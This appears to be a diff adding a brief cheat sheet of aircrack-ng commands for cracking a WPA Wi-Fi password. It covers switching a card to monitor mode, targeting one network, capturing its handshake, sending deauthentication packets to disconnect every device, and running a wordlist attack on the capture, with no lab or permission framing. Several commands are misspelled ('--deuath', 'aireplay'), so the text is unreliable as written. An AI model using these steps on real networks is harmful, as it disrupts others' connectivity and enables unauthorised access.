@@ -1,0 +1,24 @@
+# check wireless mode and interface
+iwconfig
+
+# enable monitor mode
+airmon-ng start interface
+
+# scan all wifi
+airodump-ng interface
+note the bssid of the wifi and channel no.
+
+# monitor only one wifi
+airodump-ng interface -c channel_no --bssid bssid
+
+# monitor and save handshake file
+airodump-ng interface -c channel_no --bssid bssid -w handshacke_filename
+
+# now send deuath signal to disconnect all devices
+aireplay --deuath 0 -a bssid interface
+
+
+
+# once handshake captured
+aircrack-ng -w wordlist handshake_file.cap -a bssid
+
